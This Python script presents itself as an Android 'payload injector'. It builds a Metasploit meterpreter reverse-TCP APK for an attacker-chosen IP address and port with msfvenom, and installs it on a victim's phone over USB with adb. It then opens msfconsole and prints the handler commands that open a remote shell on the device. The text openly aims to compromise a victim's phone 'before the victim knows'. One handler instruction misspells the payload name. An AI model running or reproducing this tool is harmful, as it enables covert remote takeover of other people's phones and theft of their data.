###For importing modules
import os
import sys
import time as t
from colorama import Fore,Style

os.system('clear')
##FOrLogo
print(Fore.RED + "\n\t\t\t\t PAYLOAD INJECTOR by LogOut!!!")
print("\n\t\t Inject the payload in one click before the victim knows.")
print("\n\t\t\t\t PAYLOAD FOR METASPLOIT-FRAMEWORK!!")

print("\n\n\n  MAKE SURE TO PLACE HacksByLogOut FOLDER TO PLACE ON ROOT DIRECTORY! else errors may occour" + Style.RESET_ALL)
##for inputs
own_ip = input("\n Enter Your Host IP address : ")
own_port = input("\n Enter a PORT : ")
t.sleep(1)
print("\n\t\t We are analysing the given Ip and PORT!! wait for few seconds")
t.sleep(3)
if own_ip == '' or own_port == '' :
    print("\n\t\t\t\t IP or PORT can't be empty!")

else:
    print("\n\t\t\t\t Creating a payload !!")
    print(Fore.RED + "\n\t This might take some time depending upon your system and Internet! Be Patient!")
    t.sleep(2)

    ## creating a payload

    os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=' + own_ip + ' LPORT=' + own_port + ' R> /root/HacksByLogOut/android.apk')


    t.sleep(2)
    print(Style.RESET_ALL + "\n\t\t Payload created. Time to inject it in Victim's device! Whooo Whooo")
    t.sleep(2)

    print("\n Connect victims phone with usb and turn on usb debugging. This injection takes a few seconds only!!")
    print( Fore.RED + "\n\t\t\t Allow all the prompts in Android Phone!!! ")
    t.sleep(10)
    print("\n\t\t\t\t Setting Up Device Installation!!" + Style.RESET_ALL)
    t.sleep(1)
    os.system('adb devices')

    t.sleep(5)

    os.system('adb install /root/HacksByLogOut/android.apk')

    t.sleep(2)
    print("\n\n\t\t\t\t PAYLOAD INJECTION SUCESSFUL! ")
    t.sleep(1)
    print(Fore.RED + "\n\n The device can be removed from the system! You can see MainActivity on apps drawer. this is the injected payload." + Style.RESET_ALL)

    print("\n\n\t\t\t\t Opening MSFCONSOLE *!*!*!*!")
    t.sleep(3)
    os.system('gnome-terminal -e msfconsole')

    t.sleep(5)
    print("\n\n\n\n\n\t Now type the following command step by step in msfconsole open on another terminal")
    t.sleep(2)
    print(Fore.WHITE + "\n\n\n 1> use exploit/multi/handler")
    print("\n 2> set payload android/meterpreter/reveres_tcp")
    print("\n 3> set LHOST " + own_ip)
    print("\n 4> set LPORT " + own_port)
    print("\n 5> exploit" + Style.RESET_ALL)

    t.sleep(2)
    print(Fore.RED + "\n Be sure to be connected on same Wi-FI !!")
    t.sleep(5)
    print("\n\n Now lauch the MainActivity on phone for one time and you will be connected to victims phone!!")
    print("\n use help command to see sorts of things you can do !!" + Style.RESET_ALL)


    t.sleep(2)
    print(Fore.MAGENTA + "\n\n\n\t\t\t HAPPY HACKING TO ALL OF YOU FROM LOGOUT!!" + Style.RESET_ALL)
